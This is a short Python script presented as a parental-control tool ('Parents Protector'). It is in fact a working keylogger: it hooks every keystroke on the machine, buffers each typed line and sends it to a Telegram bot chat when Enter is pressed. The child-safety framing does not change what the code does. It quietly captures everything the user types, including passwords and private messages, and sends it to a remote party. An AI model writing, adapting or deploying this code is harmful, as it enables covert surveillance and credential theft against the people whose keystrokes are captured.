import signal
import logging
import keyboard
import requests

# Configuration
LOG_FILE = "childsafety.txt"
BOT_TOKEN = "your-bot-token-here"
CHAT_ID = "your-chat-id-here"


def send_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

def keyboard_interrupt_handler(signal, frame):
    print("\nExiting .")
    keyboard.unhook_all()
    exit(0)

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s %(message)s')


signal.signal(signal.SIGINT, keyboard_interrupt_handler)

# Buffer to store keystrokes before sending
buffered_keypress = ""

# Function to handle key press
def on_press(event):
    global buffered_keypress
    
    key = event.name
    
    if key == "enter":
        if buffered_keypress:
            send_message(f"->: {buffered_keypress}")
            buffered_keypress = ""
    else:
        if len(key) == 1:
            buffered_keypress += key
        elif key == "space":
            buffered_keypress += " "
        elif key == "tab":
            buffered_keypress += "\t"

print("Starting Parents Protector. Press Ctrl+C to stop.")

try:
    # Hook keyboard events
    keyboard.on_press(on_press)

    # Keep the program running
    keyboard.wait()
except KeyboardInterrupt:
    keyboard_interrupt_handler(signal.SIGINT, None)
    
